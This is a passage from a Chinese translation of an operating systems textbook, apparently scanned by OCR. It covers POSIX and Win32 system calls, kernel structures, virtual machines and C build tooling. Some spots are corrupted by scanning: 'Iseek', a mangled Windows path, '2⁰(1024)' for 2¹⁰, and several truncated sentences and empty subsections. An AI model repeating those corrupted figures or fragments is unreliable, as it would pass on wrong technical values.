如果读者认为exec过于复杂，那么也不要失望。
这是在POSIX 的全 部系统调用中最复杂的一个(语义上),其他的都非常简单。
作为一个 简单例子，考虑exit, 这是在进程完成执行后应执行的系统调用。
这个 系统调用有一个参数——退出状态(0至255),该参数通过waitpid 系统 调用中的statloc返回父进程。
在UNIX中的进程将其存储空间划分为三段：正文段(如程序代码)、 数据段 (如变量)以及堆栈段。
数据向上增长而堆栈向下增长，如图1- 20所示。
夹在中间的是未使用的地址空间。
堆栈在需要时自动地向中间 增长，不过数据段的扩展是显式地通过系统调用brk 进行的，在数据段 扩充后，该系统调用指定一个新地址。
但是，这个调用不是POSIX标准
地址(十六进制)
图1-20 进程有三段：正文段、 数据段和堆栈段
中定义的，对于存储器的动态分配，鼓励程序员使用malloc 库过程，而malloc 的内部实现则不是一个适 合标准化的主题，因为几乎没有程序员直接使用它，我们有理由怀疑是否会有人注意到brk 实际不是属 于POSIX 的 。
1.6.2 用于文件管理的系统调用
许多系统调用与文件系统有关。
本小节讨论在单个文件上的操作，1.6.3节将讨论与目录和整个文件 系统有关的内容。
要读写一个文件，先要使用open 打开该文件。
这个系统调用通过绝对路径名或指向工作目录的相 对路径名指定要打开文件的名称，而代码O_RDONLY 、O_WRONLY 或O_RDWR 的含义分别是只读、只 写或两者都可以。
为了创建一个新文件，使用O_CREAT 参数。
然后可使用返回的文件描述符进行读写 操作。
接着，可以用close 关闭文件，这个调用使得该文件描述符在后续的open 中被再次使用。
毫无疑问，最常用的调用是read 和write 。
我们在前面已经讨论过read 。
write 具有与read 相同的参数。
尽管多数程序频繁地读写文件，但是仍有一些应用程序需要能够随机访问一个文件的任意部分。
与 每个文件相关的是一个指向文件当前位置的指针。
在顺序读(写)时，该指针通常指向要读出(写入) 的下 一个字节。
Iseek 调用可以改变该位置指针的值，这样后续的read 或write 调用就可以在文件的任何 地方开始。
Iseek有三个参数：第一个是文件的描述符，第二个是文件位置，第三个说明该文件位置是相对于文 件起始位置、当前位置还是文件的结尾。
在修改了指针之后，I seek所返回的值是文件中的绝对位置。
UNIX 为每个文件保存了该文件的类型(普通文件、特殊文件、目录等)、大小、最后修改时间以及 其他信息。
程序可以通过stat 系统调用查看这些信息。
第一个参数指定了要被检查的文件；第二个参数是 一个指针，该指针指向存放这些信息的结构。
对于一个打开的文件而言，fstat 调用完成同样的工作。
1.6.3 用于目录管理的系统调用
本小节我们讨论与目录或整个文件系统有关的某些系统调用，而不是1.6.2节中与一个特定文件有关 的系统调用。
mkdir 和rmdir分别用于创建和删除空目录。
下一个调用是link。
它的作用是允许同一个文
件以两个或多个名称出现，多数情形下是在不同的目录中这样做。
它的典型应用是，在同一个开发团队 中允许若干个成员共享一个共同的文件，他们每个人都在自己的目录中有该文件，但可能采用的是不同 的名称。
共享一个文件，与每个团队成员都有一个私用副本并不是同一件事，因为共享文件意味着任何 成员所做的修改都立即为其他成员所见——只有一个文件存在。
而在复制了一个文件的多个副本之后， 对其中一个副本所进行的修改并不会影响到其他的副本。
为了考察link是如何工作的，考虑图1-21a中的情形。
有两个用户ast和jim, 每个用户都有一些文件
的目录。
若ast 现在执行一个含有系统调用的程序
link("/usr/jim/memo","usr/ast/note");
jim目录中的文件memo以文件名note 进入ast 的目录。
之后，/usr/jim/memo 和/usr/ast/note 都引用相同的文件。
顺便提及，用户是将目录保存在/usr 、/user 、/home 还是其他地方，完全取决于本地系统管理员。
理解link 是如何工作的也许有助于读者看清其作用。
在UNIX 中，每个文件都有唯一的编号，即i-编 号，用以标识文件。
该i- 编号是对i- 节点表格的一个引用，它们一一对应，说明该文件的拥有者、磁盘 块的位置等。
目录就是一个包含了(i- 编号，ASCII 名称)对集合的文件。
在UNIX的第一个版本中，每 个目录项有16字节——2字节用于i-编号，14字节用于名称。
现在为了支持长文件名，采用了更复杂的结 构，但是，在概念上，目录仍然是 (i- 编 号 ，ASCII 名称)对的一个集合。
在图1-21中，mail 为i-编号16, 等等。
link所做的只是利用某个已有文件的i-编号，创建一个新目录项(也许用一个新名称)。
在图1-21b 中两个目录项有相同的i- 编号(70),从而指向同一个文件。
如果使用unlink 系统调用将其中一个文件移 走了，可以保留另一个。
如果两个都被移走了，UNIX 00看到尚且存在的文件没有目录项 (i- 节点中的 一个域记录着指向该文件的目录项),就会把该文件从磁盘中移去。
图1-21 a) 将/usr/jim/memo链接到ast 目录之前的两个目录；b) 链接之后的两个目录
正如我们已经叙述过的，mount 系统调用允许将两个文件系统合并成为一个。
通常的情形是，在硬 盘某个分区中的根文件系统含有常用命令的二进制(可执行)版和其他常用的文件；用户文件在另一个 分区。
并且，用户可插入包含需要读入的文件的U盘。
mount("/dev/sdb0","/mnt",0);
这里，第一个参数是USB 驱动器0的块特殊文件名称，第二个参数是要被安装在树中的位置，第三个参 数说明将要安装的文件系统是可读写的还是只读的。
O
dev
a) b)
图1-22 a) 安装前的文件系统；b) 安装后的文件系统
在mount 调用之后，驱动器0上的文件可以使用从根目录开始的路径或工作目录路径，而不用考虑 文件在哪个驱动器上。
事实上，第二个、第三个以及第四个驱动器也可安装在树上的任何地方。
mount 调用使得把可移动介质都集中到一个文件层次中成为可能，而不用考虑文件在哪个驱动器上。
尽管这是 个CD-ROM 的例子，但是也可以用同样的方法安装硬盘或者硬盘的一部分(常称为分区或次级设备), 外部硬盘和USB 盘也一样。
当不再需要一个文件系统时，可以用umount 系统调用卸载之。
1.6.4 各种系统调用
有各种的系统调用。
这里介绍系统调用中的一部分。
chdir 调用改变当前的工作目录。
在调用 chdir("/usr/ast/test");
之后，打开xyz文件，会打开/usr/ast/test/xyz。
工作目录的概念消除了总是键入(长)绝对路径名的需要。
在UNIX中，每个文件有一个保护模式。
该模式包括针对所有者、组和其他用户的读一写一执行位。
chmod 系统调用可以改变文件的模式。
例如，要使一个文件对除了所有者之外的用户只读，可以执行
chmod("file",0644);
kill系统调用供用户或用户进程发送信号用。
若一个进程准备好捕捉一个特定的信号，那么,在信号到来 时，运行一个信号处理程序。
如果该进程没有准备好，那么信号的到来会杀掉该进程(此调用名称的由来)。
POSIX 定义了若干处理时间的过程。
例如，time以秒为单位返回当前时间，0对应着1970年1月1日 午夜(从此日开始，没有结束)。
在一台32位字的计算机中，time 的最大值是2³²-1秒(假设是无符号整 数)。
这个数字对应136年多一点。
所以在2106年，32位的UNIX 系统会发狂，与2000年对世界计算机造 成严重破坏的知名Y2K问题是类似的。
如果读者现在有32位UNIX 系统，建议在2106年之前的某时刻更 换为64位的系统。
1.6.5 Windows Win32 API
当然，在Windows中也有系统调用。
在UNIX中，系统调用(如read) 和系统调用所使用的库过程 ( 如read) 之间几乎是一一对应的关系。
换句话说，对于每个系统调用，差不多就涉及一个被调用的库 过程，如图1-17所示。
此外，POSIX 有约100个过程调用。
Win32 API 调用的数量是非常大的，有数千个。
此外，尽管其中许多确实涉及系统调用，但有一大 批Win32 API完全是在用户空间进行的。
结果，在Windows中，不可能了解哪一个是系统调用(如由内 核完成),哪一个只是用户空间中的库调用。
事实上，某个版本中的一个系统调用，会在另一个不同版 本的用户空间中执行，或者相反。
当我们在本书中讨论Windows的系统调用时，将使用Win32过程(在 合适之处),这是因为微软保证：随着时间流逝，Win32 过程将保持稳定。
但是读者有必要记住，它们并 不全都是系统调用(即陷入内核中)。
Win32 API中有大量的调用，用来管理视窗、几何图形、文本、字体、滚动条、对话框、菜单以及 GUI的其他功能。
为了使图形子系统在内核中运行(某些Windows 版本中确实是这样，但不是所有的版
本),需要系统调用，否则只有库调用。
在本书中是否应该讨论这些调用呢?
由于它们与操作系统的功 能并不相关，我们还是决定不讨论它们，尽管它们会在内核中运行。
对Win32 API有兴趣的读者应该参 阅一些书籍中的有关内容(例如，Hart,1997;Rector 和Newcomer,1997;Simon,1997)。
我们在这里介绍所有的Win32 API,不过这不是我们关心的主要问题，所以做了一些限制，只将那 些与图1-18中UNIX系统调用大致对应的Windows调用列在图1-23中。
图1-23 与图1-18中UNIX调用大致对应的Win32 API调用
下面简要地说明一下图1-23中的内容。
CreateProcess 用于创建一个新进程，它把UNIX中的fork 和execve 结合起来。
它有许多参数用来指定新创建进程的性质。
Windows 中没有类似UNIX 中的进程层 次，所以不存在父进程和子进程的概念。
在进程创建之后，创建者和被创建者是平等的。
WaitForSingleObject 用于等待一个事件，等待的事件可以是多种可能的事件。
如果有参数指定了某个 进程，那么调用者等待所指定的进程退出，这通过使用ExitProcess 完成。
接下来的6个调用进行文件操作，在功能上和UNIX的对应调用类似，而在参数和细节上是不同的。
和UNIX中一样，文件可被打开、关闭和写入。
SetFilePointer 以及GetFileAttribu tesEx 调用设置文件的 位置并取得文件的属性。
Windows 中有目录，目录分别用CreateDirectory以及RemoveDirectory API调用创建和删除。
也有 对当前目录的标记，这可以通过SetCurrentDirectory 来设置。
使用GetLocalTime 可获得当前时间。
也许有必要对Win32 做最后的说明。
Win32 并不是一个非常统一的或一致的接口。
其主要原因是 Win32需要与早期的在Windows 3.x中使用的16位接口向后兼容。
1.7 操作系统结构
我们已经分析了操作系统的外部(如程序员接口),现在是分析其内部的时候了。
在下面的小节中，
1.7.1 单体系统
到目前为止，在大多数常见的组织中，整个操作系统在内核态以单一程序的方式运行。
整个操作系 统以过程集合的方式编写，链接成一个大型可执行二进制程序。
使用这种技术，系统中每个过程可以自 由调用其他过程，只要后者提供了前者所需要的一些有用的计算工作。
调用任何一个你所需要的过程或 许会非常高效，但上千个可以不受限制地彼此调用的过程常常导致系统笨拙且难于理解。
并且，任何一 个过程的崩溃都会连累整个系统。
在使用这种处理方式构造实际的目标程序时，首先编译所有单个的过程，或者编译包含过程的文件， 然后通过系统链接程序将它们链接成单一的目标文件。
依靠对信息的隐藏处理，不过在这里实际上是不 存在的，每个过程对其他过程都是可见的(相反，构造中有模块或包，其中多数信息隐藏在模块之中， 而且只能通过正式设计的入口点实现模块的外部调用)。
对于这类操作系统的基本结构，有着如下结构上的建议：
过程为其工作并运行之。
要有一组实用程序来
户程序取数据等。
可将各种过程划分为一个三
层的模型，如图1-24所示。
除了在计算机初启时所装载的核心操作系
统外，许多操作系统支持可装载的扩展，诸如 图1-24 简单的单体系统结构模型
I/O 设备驱动和文件系统。
这些部件可以按照需
要载入。
在UNIX中它们被叫作共享库 (shared library),在 Windows 中则被称为动态链接库 (Dynamic-
Link Library,DLL)。
它们的扩展类型为.dll, 在C:1Windowslsystem32 目录下存在1000多个DDL文件。
1.7.2 层次式系统
把图1-24中的系统进一步通用化，就变成一个层次式结构的操作系统，它的上层软件都是在下一层 软件的基础之上构建的。
E.W.Dijkstra 和他的学生在荷兰的Eindhoven 技术学院所开发的THE 系统(1968), 是按此模型构造的第一个操作系统。
THE 系统是为荷兰的一种计算机Electrologica X8配备的一个简单的 批处理系统，其内存只有32K个字，每字27位(那时二进制位是很昂贵的)。
该系统共分为六层，如图1-25所示。
处理 器分配在第0层中进行，当中断发生或定时器 到期时，由该层进行进程切换。
在第0层之上， 系统由一些连续的进程所组成，编写这些进程 时不用再考虑在单处理器上多进程运行的细 节。
也就是说，在第0层中提供了基本的CPU 多道程序设计功能。
内存管理在第1层中进行，它分配进程的 图1-25 THE 操作系统的结构
主存空间，当内存用完时则在一个512K字的磁鼓上保留进程的一部分(页面)。
在第1层上，进程不用 考虑它是在磁鼓上还是在内存中运行。
第1层软件保证一旦需要访问某一页面，该页面必定已在内存中， 并在页面不再需要时将其移出。
第2层处理进程与操作员控制台(即用户)之间的通信。
在这层的上部，可以认为每个进程都有自 己的操作员控制台。
第3层管理I/O设备和相关的信息流缓冲区。
在第3层上，每个进程都与有良好特性 的抽象I/O设备打交道，而不必考虑外部设备的物理细节。
第4层是用户程序层。
用户程序不用考虑进程、 内存、控制台或I/O 设备管理等细节。
系统操作员进程位于第5层中。
在MULTICS系统中采用了更进一步的通用层次化概念。
MULTICS 由许多的同心环构造而成，而不 是采用层次化构造，内环比外环有更高的级别(它们实际上是一样的)。
当外环的过程欲调用内环的过 程时，它必须执行一条等价于系统调用的TRAP 指令。
在执行该TRAP 指令前，要进行严格的参数合法 性检查。
在MULTICS中，尽管整个操作系统是各个用户进程的地址空间的一部分，但是硬件仍能对单 个过程(实际是内存中的一个段)的读、写和执行进行保护。
实际上，THE 分层方案只是为设计提供了一些方便，因为该系统的各个部分最终仍然被链接成了完 整的单个目标程序。
而在MULTICS 里，环形机制在运行中是实际存在的，而且是由硬件实现的。
环形 机制的一个优点是很容易扩展，可用以构造用户子系统。
例如，在一个MULTICS 系统中，教授可以写 一个程序检查学生编写的程序并给他们打分，在第n个环中运行教授的程序，而在第n+1个环中运行学生 的程序，这样学生就无法篡改教授所给出的成绩。
1.7.3 微内核
在分层方式中，设计者要确定在哪里划分内核-用户的边界。
传统上，所有的层都在内核中，但是 这样做没有必要。
事实上，尽可能减少内核态中功能的做法更好，因为内核中的错误会快速拖累系统。
相反，可以把用户进程设置为具有较小的权限，这样，某个错误的后果就不会是致命的。
有不少研究人员对每千行代码中错误的数量进行了分析(例如，Basilli 和Perricone,1984;Ostrand
和Weyuker,2002) 。
代码错误的密度取决于模块大小、模块寿命等，不过对一个实际工业系统而言，每 千行代码中会有2～10个错误。
这意味着在有500万行代码的单体操作系统中，大约有10000～50000个 内核错误。
当然，并不是所有的错误都是致命的，诸如给出了不正确的故障信息之类的某些错误，实际 是很少发生的。
无论怎样看，操作系统中充满了错误，所以计算机制造商设置了复位按钮(通常在前面 板上),而电视机、立体音响以及汽车的制造商则不这样做，尽管在这些装置中也有大量的软件。
在微内核设计背后的思想是，为了实现高可靠性，将操作系统划分成小的、良好定义的模块，只有 其中一个模块——微内核——运行在内核态，其余的模块由于功能相对弱些，则作为普通用户进程运行。
特别地，由于把每个设备驱动和文件系统分别作为普通用户进程，这些模块中的错误虽然会使这些模块 崩溃，但是不会使得整个系统死机。
所以，音频驱动中的错误会使声音断续或停止，但是不会使整个计 算机垮掉。
相反，在单体系统中，由于所有的设备驱动都在内核中， 一个有故障的音频驱动很容易引起 对无效地址的引用，从而造成恼人的系统立即停机。
MINIX 3微内核只有12000行C语言代码和1400行用于非常低层次功能的汇编语言代码，诸如捕获 中断、进程切换等。
C 代码管理和调度进程、处理进程间通信(在进程之间传送信息)、提供大约40个内 核调用，它们使得操作系统的其余部分可以完成其工作。
这些调用完成诸如连接中断句柄、在地址空间 中移动数据以及为新创建的进程安装新的内存映像等功能。
MINIX 3的进程结构如图1-26所示，其中内
核调用句柄用Sys 标记。
时钟设备驱动也在内核中，因为这个驱动与调度器交互密切。
所有的其他设备 驱动都作为单独的用户进程运行。
图1-26 MINIX 3系统的结构
在内核的外部，系统的构造有三层进程，它们都在用户态运行。
最底层中包含设备驱动器。
由于它 们在用户态运行，所以不能物理地访问I/O端口空间，也不能直接发出I/O命令。
相反，为了能够对I/O设 备编程，驱动器构建了一个结构，指明哪个参数值写到哪个I/O 端口，并生成一个内核调用，通知内核 完成写操作。
这个处理意味着内核可以检查驱动正在对I/O的读(或写)是否是得到授权使用的。
这样， (与单体设计不同)一个有错误的音频驱动器就不能够偶发性地在硬盘上进行写操作。
一个与小内核相关联的思想是内核中的机制与策略分离的原则。
为了更清晰地说明这一点，我们考 虑进程调度。
一个比较简单的调度算法是，对每个进程赋予一个优先级，并让内核执行具有最高优先级 的进程。
这里，机制(在内核中)就是寻找最高优先级的进程并运行之。
而策略(赋予进程优先级)可 以由用户态中的进程完成。
在这种方式中，机制和策略是分离的，从而使系统内核变得更小。
1.7.5 虚拟机
oS/360 的最早版本是纯粹的批处理系统。
然而，有许多360用户希望能够在终端上交互工作，于 是IBM公司内外的一些研究小组决定为它编写一个分时系统。
后来推出了正式的IBM分时系统TSS/360。
1.VM/370
这个系统最初被命名为CP/CMS, 后来改名为VM/370(Seawright 和MacKinnon,1979) 。
它是源于 如下机敏的观察，即分时系统应该提供这些功能：(1)多道程序，(2)一个比裸机更方便的、有扩展界 面的计算机。
VM/370 存在的目的是将二者彻底地隔离开来。
这个系统的核心称为虚拟机监控程序 (virtual machine monitor),它在裸机上运行并且具备了多道
程序功能。
该系统向上层提供了若干台虚拟 机，如图1-28所示。
它不同于其他操作系统 的地方是：这些虚拟机不是那种具有文件等 优良特征的扩展计算机。
与之相反，它们仅 仅是裸机硬件的精确复制品。
这个复制品包 含了内核态/用户态、I/O功能、中断及其他 真实硬件所应该具有的全部内容。
由于每台虚拟机都与裸机相同，所以在 每台虚拟机上都可以运行一台裸机所能够运
图1-28 配有CMS的VM/370结构
行的任何类型的操作系统。
不同的虚拟机可以运行不同的操作系统，而且实际上往往就是如此。
在早期 的VM/370系统上，有一些系统运行OS/360 或者其他大型批处理或事务处理操作系统，而另一些虚拟机 运行单用户、交互式系统供分时用户使用，这个系统称为会话监控系统 (Conversational Monitor System, CMS) 。
后者在程序员中很流行。
当一个CMS程序执行系统调用时，该调用被陷入到其虚拟机的操作系统上，而不是VM/370上，似 乎它运行在实际的机器上，而不是在虚拟机上。
CMS 然后发出普通的硬件I/O 指令读出虚拟磁盘或其他需
要执行的调用。
这些I/O指令由VM/370陷入，然后，作为对实际硬件模拟的一部分，VM/370完成指令。
通过对多道程序功能和提供扩展机器二者的完全分离，每个部分都变得非常简单、非常灵活且容易维护。
虚拟机的现代化身z/VM通常用于运行多个完整的操作系统，而不是简化成如CMS一样的单用户系 统。
例如，zSeries 有能力与传统的IBM操作系统一起，运行一个或多个Linux虚拟机。
2. 虚拟机的再次发现
c)
图1-29 a) 第 一类虚拟机管理程序； b) 理论第二类虚拟机管理程序；c) 实际第二类虚拟机管理程序
虚拟机的吸引力是没有争议的，问题在于实现。
为了在一台计算机上运行虚拟机软件，其CPU必须 被虚拟化(Popek 和Goldberg,1974) 。
简言之，存在一个问题。
当运行虚拟机(在用户态)的操作系统 执行某个特权指令时，比如修改PSW或进行I/O操作，硬件实际上陷入到了虚拟机中，这样有关指令就 可以在软件中模拟。
在某些CPU上(特别是Pentium和它的后继者及其克隆版中)试图在用户态执行特 权指令时，会被忽略掉。
这种特性使得在这类硬件中无法实现虚拟机，这也解释了PC世界对虚拟机不感 兴趣的原因。
当然，对于Pentium而言，还有解释器可以运行在Pentium上，例如Bochs但是其性能丧失 了1～2数量级，这样对于要求高的工作来说就没有意义了。
由于20世纪90年代和本世纪这些年来若干学术研究小组的努力，特别是斯坦福大学的Disco (Bugnion 等人，1997)和剑桥大学的Xen(Barham 等人，2003)实现了商业化产品(例如VMware工作 站和Xen), 使得人们对虚拟机的热情得以复燃。
除了VMware和Xen外，现在流行的虚拟机管理程序还 有KVM (针对Linux内核)、Oracle公司的VirtualBox以及微软公司的Hyper-V。
一些早期研究项目通过即时翻译大块代码、将其存储到内部高速缓存并在其再次执行时复用的方式， 提 高 了Bochs 等翻译器的性能。
这种手段大幅提高了性能，也推动了模 拟 器 (machine simulator) 的 出 现 ，
如图1-29b所示。
这项被称为二进制翻译 ( binary translation) 的技术对性能的提升有所帮助，不过， 生成的系统虽然优秀到足以在学术会议上发表论文，但仍没有快到可以在极其注重性能的商业环境下 使用。
实际上，第一类和第二类虚拟机管理程序的真正区别在于，后者利用宿主操作系统 (host operating system) 并通过其文件系统创建进程、存储文件等。
第一类虚拟机管理程序没有底层支持，所以必须自 行实现所有功能。
处理控制指令的一种不同方式是，修改操作系统，删掉它们。
这种方式不是真正的虚拟化，而是半 虚拟化 (paravirtualization) 。
我们将在第7章具体讨论虚拟化。
3.Java 虚拟机
1.7.6 外核
与虚拟机克隆真实机器不同，另一种策略是对机器进行分区，换句话说，给每个用户整个资源的一个 子集。
这样，某个虚拟机可能得到磁盘的0至1023盘块，而另一台虚拟机会得到1024至2047盘块，等等。
在底层中，一种称为外核 (exokernel,Engler 等人，1995)的程序在内核态运行。
它的任务是为虚 拟机分配资源，并检查使用这些资源的企图，以确保没有机器会使用他人的资源。
每个用户层的虚拟机 可以运行自己的操作系统，如VM/370和Pentium 虚拟8086等，但限制只能使用已经申请并且获得分配的 那部分资源。
1.8 依靠C 的世界
操作系统通常是由许多程序员写成的，包括很多部分的大型C (有时是C++) 程序。
用于开发操作 系统的环境，与个人(如学生)用于编写小型Java程序的环境是非常不同的。
本节试图为那些有时编写 Java 或者Python程序的程序员简要地介绍编写操作系统的环境。
1.8.1 C语 言
这里不是C 语言的指南，而是简要介绍C与类Python 语言特别是Java 之间的关键差别。
Java 是基于C 的，所以两者之间有许多类似之处。
Python 有一点不同，但仍然十分相似。
为方便起见，我们将注意力 放在Java 上 。
Java 、Python 和C都是命令式的语言，例如，有数据类型、变量和控制语句等。
在C中基本 数据类型是整数(包括短整数和长整数)、字符和浮点数等。
使用数组、结构体和联合，可以构造组合 数据类型。
C 语言中的控制语句与Java 类似，包括if、switch 、for 以 及while 等语句。
在这两个语言中， 函数和参数大致相同。
一 项C语言中有而Java 和Python 中没有的特点是显式指针 (explicit pointer )。
指针是 一种指向(即 包含对象的地址)一个变量或数据结构的变量。
考虑下面的语句：
char c1,c2,*p;
c1='c';
p=&c1;
c2=*p;
这些语句声明c1和c2 是字符变量，而p是指向一个字符的变量(即包含字符的地址)。
第一个赋值语句将 字符c的ASCII 代码存到变量c1中。
第二个语句将c1的地址赋给指针变量p。
第三个语句将由p指向变量的 内容赋给变量c2, 这样，在这些语句执行之后，c2 也含有c的 ASCII 代码。
在理论上，指针是输入类型， 所以不能将浮点数地址赋给一个字符指针，但是在实践中，编译器接受这种赋值，尽管有时给出一个警 告。
指针是一种非常强大的结构，但是如果不仔细使用，也会是造成大量错误的一个原因。
C 语言中没有包括内建字符串、线程、包、类、对象、类型安全 (type safety) 以及垃圾回收 (garbage collection) 等。
最后一个是操作系统的“淋浴器塞子”。
在C中分配的存储空间或者是静态的，或 者是程序员明确分配和释放的，通常使用malloc以及free库函数。
正是由于后面这个性质——由程序员控制 所有内存——而且是用明确的指针，使得C 语言对编写操作系统而言非常有吸引力。
从一定程度上来说， 操作系统实际上是个实时系统，甚至通用系统也是实时系统。
当中断发生时，操作系统可能只有若干微秒 去完成特定的操作，否则就会丢失关键的信息。
在任意时刻启动垃圾回收功能是不可接受的。
1.8.2 头 文 件
一个操作系统项目通常包括多个目录，每个目录都含有许多.c文件，这些文件中存有系统某个部分 的代码，而一些.h 头文件则包含供一个或多个代码文件使用的声明以及定义。
头文件还可以包括简单的 宏，如
#define BUFFER_SIZE 4096
宏允许程序员命名常数，这样代码中出现的BUFFER_SIZE 在编译时就被数值4096所替代。
良好的C 程序 设计实践是命名除了0,1和-1之外的所有常数，有时甚至也命名这三个数。
宏可以附带参数，例如
#define max(a,b)(a>b?
a:b) 这个宏允许程序员编写
i=max(j,k+1)
从而得到
i=(j>k+1?
j:k+1)
将j与k+1 之间的较大者存储在i中。
头文件还可以包含条件编译，例如 #ifdef X86
intel_int_ack();
#endif
如果宏x86 有定义，而不是其他，则编译进对intel_int_ack 函数的调用。
为了分隔与结构有关的代码，大 量使用了条件编译，这样只有当系统在x86 上编译时， 一些特定的代码才会被插入，其他的代码仅当系 统在SPARC等机器上编译时才会插入。
通过使用#include 指令，一个.c文件体可以含有零个或多个头文件。
引 论 43
1.8.3 大型编程项目
为了构建操作系统，每个.c 被C编译器编译成一个目标文件。
目标文件使用后缀.0,含有目标机器 的二进制代码。
随后它们可以直接在CPU上运行。
在C的世界里，没有类似于Java 字节代码的东西。
由于操作系统非常大(500万行代码是很寻常的),每当文件修改后就重新编译是无法忍受的。
另一 方面，改变了用在成千上万个文件中的一个关键头文件，确实需要重新编译这些文件。
没有一定的协助， 要想记录哪个目标文件与哪个头文件相关是完全不可行的。
幸运的是，计算机非常善于处理事物分类。
在UNIX系统中，有个名为make的程序(其大量的变体如 gmake 、pmake等),它读入Makefile, 该 Makefile说明哪个文件与哪个文件相关。
make的作用是，在构建操 作系统二进制码时，检查此刻需要哪个目标文件，而且对于每个文件，检查自从上次目标文件创建之后是 否有任何它依赖的文件(代码和头文件)已经被修改了。
如果有，目标文件需要重新编译。
在make确定了 哪个.o 文件需要重新编译之后，它调用C编译器重新编译这些文件，这样，就把编译的次数降到最低限度。
在大型项目中，创建Makefile是一件容易出错的工作，所以出现了一些工具使该工作能够自动完成。
一旦所有的.o文件就绪，这些文件被传递给称为linker 的程序，将其组合成一个可执行的二进制文 件。
此时，任何被调用的库函数都已经包含在内，函数之间的引用都已经解决，而机器地址也都按需要 分配完毕。
在linker 完成之后，得到一个可执行程序，在UNIX中传统上称为a.out文件。
这个过程中的各 个部分如图1-30所示，图中的程序包含三个C 文件和两个头文件。
这里虽然讨论的是有关操作系统的开 发，但是所有内容对开发任何大型程序而言都是适用的。
图1-30 编译C和头文件来构建可执行文件的过程
1.8.4 运行模型
在操作系统二进制代码链接完成后，计算机就可以重新启动，新的操作系统开始运行。
一旦运行， 系统会动态调人那些没有静态包括在二进制代码中的模块，如设备驱动和文件系统。
在运行过程中，操 作系统可能由若干段组成，有文本段(程序代码)、数据段和堆栈段。
文本段通常是不可改变的，在运
行过程中不可修改。
数据段开始时有一定的大小，并用确定的值进行初始化，但是随后就被修改了，其 大小随需要增长。
堆栈段被初始化为空，但是随着对函数的调用和从函数返回，堆栈段时时刻刻在增长 和缩小。
通常文本段放置在接近内存底部的位置，数据段在其上面，这样可以向上增长。
而堆栈段处于 高位的虚拟地址，具有向下增长的能力，不过不同系统的工作方式各有差别。
在所有情形下，操作系统代码都是直接在硬件上执行的，不用解释器，也不是即时编译，如Java通 常做的那样。
1.9 有关操作系统的研究
例如，当艾森豪威尔总统在1958年建立国防部高级研究计划署(ARPA) 时，他试图通过五角大楼 的研究预算来削弱海军和空军并维护陆军的地位。
他并不是想要发明Internet 。
但 是ARPA做的一件事 是给予一些大学资助，用以研究模糊不清的包交换概念，这个研究很快导致了第一个实验性的包交换 网的建立，即 ARPANET 。
该网在1969年启用。
没有多久，其他被ARPA 资助的研究网络也连接到 ARPANET 上，于是Internet 诞生了。
Internet “愉快地”为学术研究人员互相发送了20年的电子邮件。
到了20世纪90年代早期，Tim Berners-Lee在日内瓦的CERN 研究所发明了万维网(World Wide Web), 而Marc Andreesen 在伊利诺伊大学为万维网写了一个图形浏览器。
突然，Internet 上充满了年轻人的聊 天活动。
对操作系统的研究也导致了实际操作系统的戏剧性变化。
正如我们较早所讨论的，第一代商用计算 机系统都是批处理系统，直到20世纪60年代早期MIT发明了交互式分时系统为止。
20世纪60年代后期， 即在Doug Engelbart于斯坦福研究院发明鼠标和图形用户接口之前，所有的计算机都是基于文本的。
有 谁知道下一个发明将会是什么呢?
实际上，所有的操作系统研究人员都认识到，目前的操作系统是一个不灵活、不可靠、不安全和带 有错误的大系统，而且某个特定的操作系统较其他的系统有更多的错误 (这里略去了名称以避免责任)。
所带来的结果是，大量的研究集中于如何构造更好的操作系统。
近来出版的文献有如下一些：关于错误 和调试 (Renzelmann 等人，2012;Zhou 等人，2012),故障恢复 (Correia 等人，2012;Ma 等人， 2013;Ongaro 等人，2011;Yeh 和Cheng,2012), 能源管理 (Pathak 等人，2012;Petrucci 和Loques, 2012;Shen 等人，2013),文件和存储系统 (Elnably 和Wang,2012;Nightingale 等人，2012;Zhang 等 人，2013a), 高 性 能I/O(De Bruijn等人，2011;Li 等人，2013a;Rizzo,2012), 超线程与多线程 (Liu 等人，2011),在线更新 (Giuffrida 等人，2013),管理GPU(Rossbach 等人，2011),内存管理 (Jantz 等 人，2013;Jeong 等人，2
013),多核操作系统 (Baumann 等人，2009;Kapritsos,2012;Lachaize 等人， 2012;Wentzlaff 等人，2012),操作系统正确性 (Elphinstone 等人，2007;Yang 等人，2006;Klein 等人， 2009),操作系统可靠性 (Hruby 等人，2012;Ryzhyk 等人，2009,2011;Zheng 等人，2012),隐私与 安全 (Dunn 等人，2012;Giuffrida 等人，2012;Li 等人，2013b;Lorch 等人，2013;Ortolani 和Crispo, 2012;Slowinska 等人，2012;dranath 等人，2012),虚拟化(Agesen 等人，2012;Ben-Yehuda 等人，
2010;Colp 等人，2011; Dai等人，2013;Tarasov 等人，2013;Williams 等人，2012)。
1.10 本书其他部分概要
我们已经叙述完毕引论，并且描绘了操作系统的图景。
现在是进入具体细节的时候了。
正如前面已 经叙述的，从程序员的观点来看，操作系统的基本目的是提供一些关键的抽象，其中最重要的是进程和 线程、地址空间以及文件。
所以后面三章都是有关这些关键主题的。
第2章讨论进程与线程，包括它们的性质以及它们之间如何通信。
这一章还给出了大量关于进程间 如何通信的例子以及如何避免某些错误。
第4章里，我们会讨论有关文件系统的所有重要内容。
在某种程度上，用户看到的是大量文件系统。
我们将研究文件系统接口和文件系统的实现。
输入/输出是第5章的内容。
这一章介绍设备独立性和设备依赖性的概念，将以若干重要的设备(包 括磁盘、键盘以及显示设备)为例进行讲解。
第6章讨论死锁。
在这一章中我们概要地说明什么是死锁，还讨论避免死锁的方法。
有一个非常重要的主题就是操作系统安全，它是第9章的内容。
在这一章中讨论的内容涉及威胁 (例如，病毒和蠕虫)、保护机制以及安全模型。
随后，我们安排了一些实际操作系统的案例。
它们是：UNIX 、Linux 和Android (第10章), Windows 8 (第11章)。
本书以第12章关于操作系统设计的一些思考作为结束。
1.11 公制单位
为了避免混乱，有必要在本书中特别指出，考虑到计算机科学的通用性，所以我们采用公制来代替 传统的英制。
在图1-31中列出了主要的公制前缀。
前缀是英文单词前面字母的缩写，凡是单位大于1的 首字母均大写。
这样， 一个1TB的数据库占据了10¹²字节的存储空间，而100 psec (或100ps) 的时钟每 隔10-¹⁰s的时间滴答一次。
由于milli 和micro 均以字母 “m” 开头，所以必须对两者做出区分。
通常，用 “m” 表示milli, 而用“μ”(希腊字母)表示micro。
图1-31 主要的公制前缀
这里需要说明的还有关于存储器容量的度量，在工业实践中，各个单位的含义稍有不同。
这里Kilo 表示2⁰(1024)而不是10³(1000),因为存储器大小总是2的幂。
这样1KB 存储器就有1024个字节，而 不是1000个字节。
